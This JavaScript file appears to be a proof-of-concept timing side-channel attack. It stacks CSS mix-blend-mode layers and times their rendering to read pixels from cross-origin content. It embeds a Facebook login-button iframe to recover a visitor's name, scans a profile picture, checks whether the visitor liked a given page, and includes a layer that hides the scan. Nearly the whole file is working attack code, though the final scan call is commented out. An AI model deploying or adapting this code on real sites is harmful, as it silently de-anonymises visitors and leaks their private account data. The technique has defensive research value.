var canvas = document.getElementById("canvas1");
    var canvas_context = canvas.getContext("2d");
    var canvas_width  = 300;
    var canvas_height = 180;
    var imageData = canvas_context.createImageData(canvas_width, canvas_height);

    var animate_iteration = 0;
    var rendering_start_time = 0;
    var animate_repetitions = 2;

    var overlay_divs = document.getElementById("frame_overlays");
    var target_div = document.getElementById("target_div");
    var camouflage_layer = document.getElementById("camouflage_layer");
    var output_area = document.getElementById("output_area");
    var number_layers_text_field = document.getElementById("number_layers_text_field");

    var current_color_test = 256;
    var current_color_val = 0;
    var current_scan_mode = "color_detection";
    var current_page_liked = false;

    // Taken from: https://developer.mozilla.org/de/docs/Web/CSS/CSS_Referenz/mix-blend-mode
    var valid_blend_modes = ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge",
        "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity",
        "initial", "inherit", "unset"];

    var nodes = [];
    /**
     * Adds a layer to our scan stack.
     */
    function add_blend_layer(id, zindex, color, mode) {
        if (valid_blend_modes.indexOf(mode) == -1) {
            console.log("[-] Invalid mode passed: %s", mode);
            return;
        }
        var node = document.createElement("div");
        node.id = id;
        node.className = "overlay_layer";
        node.style.backgroundColor = color;
        node.style.mixBlendMode = mode;
        node.style.zIndex = zindex;
        overlay_divs.appendChild(node);
        nodes.push(node);
        return node;
    }

    /**
     * Creates our "scanning" stack containing blend mode div layers.
     */
    function create_overlays() {
        // subtract value for each bit we know is set
        // colors must be set later
        add_blend_layer("overlay0", 1, "rgb(0, 0, 0)", "difference");
        // colors must be set later
        add_blend_layer("overlay1", 2, "rgb(0, 0, 0)", "lighten");
        // bg_color - test_color
        // results in zero of bg_color is smaller or equal to test_color
        add_blend_layer("overlay2", 3, "rgb(0, 0, 0)", "difference");
        // if bg is not zero, set color to 255
        add_blend_layer("overlay3", 4, "rgb(255, 255, 255)", "color-dodge");
        // bg is either 0 or 255. multiply with 10 (great test value)
        // result is either 10 or 0
        // colors must be set later
        add_blend_layer("overlay4", 5, "rgb(0, 0, 0)", "multiply");

        var number_layers = number_layers_text_field.value;
        if(isNaN(number_layers)){
            alert("#layers must be numeric, please refresh.");
        }
        // Fill the remaining stack with saturation blend layers as these will cause a strong side channel signal.
        for(var i = 6; i < number_layers; i++) {
            add_blend_layer("overlay" + i, i+1, "rgb(0, 255, 0)", "saturation");
        }
    }

    /**
     * Calibrate our scanner by using three steps.
     * 1) Generate a test div that does NOT trigger our scanner (fast computation).
     * 2) Measure the timing for this setup and change the div to trigger the side-channel.
     * 3) Measure the timing again and compute an appropriate threshold.
     */
    function calibrate_threshold(calibration_resolve) {
        // Deactivate the target div for now.
        target_div.style.display = "none";

        // Increase the number of scanning steps to make the calibration more precise.
        animate_repetitions = 2;

        // Set our scanning stack to detect any colors with the blue channel >= 180.
        nodes[0].style.backgroundColor = "rgb(0, 0, 0)";
        nodes[1].style.backgroundColor = "rgb(0, 0, 180)";
        nodes[2].style.backgroundColor = "rgb(0, 0, 180)";
        nodes[4].style.backgroundColor = "rgb(0, 0, 10)";

        // Add a temporary blend layer that does not trigger the side-channel (considering the scanning stack setup).
        add_blend_layer("overlay_calibration", 0, "rgb(0, 0, 0)", "normal");

        new Promise(function(resolve) {
            requestAnimationFrame(function(timestamp) {
                animate(timestamp, resolve);
            });
        }).then(
                function(avg_rendering_time) {
                    var first_time_measurement = avg_rendering_time;
                    console.log(first_time_measurement);
                    var last_div_element = nodes[nodes.length-1];
                    last_div_element.style.backgroundColor = "rgb(0, 0, 255)";

                    new Promise(function(resolve) {
                        requestAnimationFrame(function(timestamp) {
                            animate(timestamp, resolve);
                        });
                    }).then(
                            function(avg_rendering_time) {
                                console.log(avg_rendering_time);
                                var new_treshold = first_time_measurement + (avg_rendering_time - first_time_measurement)/2;

                                // Hide our calibration layer again.
                                last_div_element.style.display = "none";
                                // Display the target div again.
                                target_div.style.display = "block";

                                // Reset the number of scanning steps to the default value.
                                animate_repetitions = 1;
                                calibration_resolve(new_treshold);
                            }
                    );
                }
        );
    }

    var last_animate_time = 0;
    var idle_time_measurement = 0;
    /**
     * Rendering loop which returns the average rendering time to the passed callback function.
     * (This function is called each time the next frame is ready to be processed.)
     */
    function animate(timestamp, resolve) {
        var t = requestAnimationFrame(function(new_timestamp) {
            animate(new_timestamp, resolve);
        });

        if(animate_iteration == 0)
            rendering_start_time = timestamp;

        // Force the rendering to kick in by alternating our scan stack visibility.
        if(frame_overlays.style.display == "none") {
            frame_overlays.style.display = "block";
        } else {
            frame_overlays.style.display = "none";
        }

        if(animate_iteration < animate_repetitions) {
            // Avoid increasing our counter for
            if(frame_overlays.style.display == "none")
                animate_iteration++;
            //else
                //idle_time_measurement += performance.now() - rendering_start_time;

            //last_animate_time
        } else {
            var time_spent = performance.now() - rendering_start_time;
            // Correct the measured time spent because we didn't render in half of the cases.
            //time_spent -= 20 * (animate_iteration / 2);

            //document.getElementById("output_area").value += "Total spent: " + Math.round(time_spent) + " ms.\n";
            //document.getElementById("output_area").value += "Avg. spent: " + Math.round(time_spent / animate_iteration) + " ms.\n";
            var avg_rendering_time = time_spent / animate_iteration;
            cancelAnimationFrame(t);
            animate_iteration = 0;
            //frame_overlays.style.display = "block";
            resolve(avg_rendering_time);
        }
    }

    var side_channel_treshold = -1;
    var target_width = -1;
    var target_height = -1;
    var current_x = -1;
    var current_y = -1;

    var current_color_channel = 0;
    var color_components = [0,0,0];
    var current_color_bit = 0;

    function image_preprocessing(last_result) {
        // #4080FF (LIKED)
        // #365899 (NOT LIKED)
        // #4267B2 (CONTINUE WITH FB COLOR)

        if (current_scan_mode == "like_detection" || current_scan_mode == "text_detection") {
            // Prepare setup to detect a specific color.
            // We want to detect if the blue channel/component has a value > 180.
            // This is enough to detect white text on the blue FB backgrounds OR to check if a button is a like button.

            current_color_test = 180;
            nodes[0].style.backgroundColor = "rgb(0, 0, 0)";
            nodes[1].style.backgroundColor = "rgb(" + (current_color_test - 1) + ", " + (current_color_test - 1) + ", " + (current_color_test - 1) + ")";
            nodes[2].style.backgroundColor = "rgb(" + (current_color_test - 1) + ", " + (current_color_test - 1) + ", " + (current_color_test - 1) + ")";
            nodes[4].style.backgroundColor = "rgb(0, 0, 10)";

            if (current_scan_mode == "text_detection") {
                if (last_result) {
                    if (last_result >= side_channel_treshold) {
                        // draw black pixel in canvas
                        canvas_context.fillStyle = "rgb(" + color_components[0] + ", " + color_components[1] + ", " + color_components[2] + ")";
                        canvas_context.fillRect(current_x * 5, current_y * 5, 5, 5);
                    }
                }

                // also paint the text
                if (current_x >= target_width) {
                    current_x = 0;
                    current_y++;
                } else {
                    current_x++;
                }
                return [(current_y >= target_height), null];
            } else {
                if (last_result) {
                    // FINISH HERE
                    //document.getElementById("output_area").value += "TIME REQ: " + last_result + " ms.\n";
                    return [true, (last_result >= side_channel_treshold)];
                }
            }
        } else {
            // current_scan_mode == "color_detection"
            // scan arbitrary picture up to a specified color precision.

            if (last_result) {
                if (last_result >= side_channel_treshold)
                    current_color_val += current_color_test;
            }

            // color precision. of 3 bits. (reads the upper 3 bits)
            if (current_color_bit >= 2) {
                // finished one channel, move on to the next one
                color_components[current_color_channel] = current_color_val;

                // reset color probe
                current_color_bit = 0;
                current_color_test = 128;
                current_color_val = 0;

                // next color channel/component
                current_color_channel++;

                if (current_color_channel > 2) {
                    // draw pixel in canvas
                    //canvas_context.fillStyle = "rgb(" + color_components[0] + ", " + color_components[1] + ", " + color_components[2] + ")";
                    canvas_context.fillStyle = "rgb(" + color_components.join(",") + ")";
                    canvas_context.fillRect(current_x * 5, current_y * 5, 5, 5);

                    // reset temporary variables and continue with next pixel
                    current_color_channel = 0;
                    if (current_x >= target_width) {
                        current_x = 0;
                        current_y++;
                    } else {
                        current_x++;
                    }
                }
            } else {
                current_color_bit++;
                current_color_test >>= 1;
            }

            nodes[0].style.backgroundColor = "rgb(" + current_color_val + ", " + current_color_val + ", " + current_color_val + ")";
            nodes[1].style.backgroundColor = "rgb(" + (current_color_test - 1) + ", " + (current_color_test - 1) + ", " + (current_color_test - 1) + ")";
            nodes[2].style.backgroundColor = "rgb(" + (current_color_test - 1) + ", " + (current_color_test - 1) + ", " + (current_color_test - 1) + ")";

            // prepare our scanner according to the current channel
            switch (current_color_channel) {
                case 0:
                    nodes[4].style.backgroundColor = "rgb(10, 0, 0)";
                    break;
                case 1:
                    nodes[4].style.backgroundColor = "rgb(0, 10, 0)";
                    break;
                case 2:
                    nodes[4].style.backgroundColor = "rgb(0, 0, 10)";
                    break;
            }

            return [(current_y >= target_height), null];
        }
        return [false, null];
    }

    function scanning(resolve, last_result) {
        // Update the scanner position.
        for(var i = 0; i < nodes.length; i++) {
            nodes[i].style.left = current_x * 25;
            nodes[i].style.top = current_y * 25;
        }

        // Prepare the scanning setup, evalaute potential last results and determine if the scan is finished.
        var scanning_results = image_preprocessing(last_result);
        var scan_finished = scanning_results[0];
        var scan_return = scanning_results[1];

        if (scan_finished) {
            resolve(scan_return);
        } else {
            new Promise(function(animate_resolve) {
                requestAnimationFrame(function(timestamp) {
                    animate(timestamp, animate_resolve);
                });
            }).then(
                    function(avg_rendering_time) {
                        scanning(resolve, avg_rendering_time);
                    }
            );
        }
    }

    function scan_profile_picture(resolve) {
        prepare_scanning();
        // Set the correct scanning mode and other scanning parameters.
        target_div.innerHTML = "";
        var iframe = document.getElementById("iframe");
        

        current_scan_mode = "color_detection";
        current_x = 0;
        current_y = 0;
        target_width = 25;
        target_height = 25;

        animate_repetitions = 2;

       
            scanning(resolve);
       
    }


    function scan_fb_name(resolve) {
        prepare_scanning();
        // Set the correct scanning mode and other scanning parameters.
        target_div.innerHTML = "";
        var iframe = document.createElement("iframe");
        iframe.id = "target_iframe";
        iframe.className = "fb_name_surface";
        iframe.src = "https://www.facebook.com/v2.2/plugins/login_button.php?app_id=274266067164&channel=https://_&locale=en_US&sdk=joey&use_continue_as=true&size=large&width=268px";
        target_div.appendChild(iframe);

        current_scan_mode = "text_detection";
        current_x = 0;
        current_y = 0;
        target_width = 43;
        target_height = 10;

        animate_repetitions = 2;

        iframe.addEventListener("load", function() {
            scanning(resolve);
        });
    }

    function likes_page(resolve) {
        prepare_scanning();
        // Set the correct scanning mode and other scanning parameters.
        target_div.innerHTML = "";
        var iframe = document.getElementById("iframe");
        
       

        current_scan_mode = "like_detection";
        current_x = 0;
        current_y = 1;

        // Improve accuracy by increasing the number of scanning repetitions.
        animate_repetitions = 5;

        new Promise(function(scanning_resolve) {
           
                scanning(scanning_resolve);
           
        }).then(
                function(scanning_result) {
                    resolve(scanning_result);
                }
        );
    }

    function toggle_hide() {
        if(!camouflage_layer.style.display || camouflage_layer.style.display == "none") {
            camouflage_layer.style.display = "block";
        } else {
            camouflage_layer.style.display = "none";
        }
    }

    function reset_canvas() {
        canvas_context.fillStyle = '#eeeeee';
        canvas_context.fillRect(0, 0, canvas_width, canvas_height);
    }

    function prepare_scanning() {
        // Reset our canvas.
        reset_canvas();
    }

    var like_status_pages = ["https://www.commondreams.org/"];
    var like_statuses = [];
    var scan_like_index = 0;
    function like_pages(resolve) {
        reset_canvas();

        if(scan_like_index >= like_status_pages.length) {
            resolve();
            return;
        }
        new Promise(function(scanning_resolve) {
            likes_page(scanning_resolve, like_status_pages[scan_like_index]);
        }).then(
                function(scanning_result) {
                    like_statuses.push(scanning_result);
                    document.getElementById("output_area").value += "Like " + like_status_pages[scan_like_index] + " ("+scanning_result+").\n";
                    scan_like_index++;
                    like_pages(resolve);
                }
        );
    }
    function getHashValue(key) {
        var matches = location.hash.match(new RegExp(key+'=([^&]*)'));
        return matches ? matches[1] : null;
    }

    // ---------------------------------------------------------------------------------------------------------
    if(getHashValue("n_layers")) {
        number_layers_text_field.value = getHashValue("n_layers");
    }

    // Create our "scanning" div stack.
    create_overlays();

    new Promise(function(resolve) {
        // Calibrate the correct side-channel timing threshold.
        calibrate_threshold(resolve);
    }).then(
            function(new_threshold) {
                // Set global threshold to the new value.
                side_channel_treshold = Math.round(new_threshold);
                document.getElementById("output_area").value += "Calibtrated threshold: " + side_channel_treshold + " ms.\n";


                // Start the scanning procedure to fetch the name.
                new Promise(function(scanning_resolve) {
                //like_pages(scanning_resolve);
                }).then(
                        function(scanning_result) {
                            document.getElementById("output_area").value += "Scanning complete ("+scanning_result+").\n";
                        }
                );
            }
    );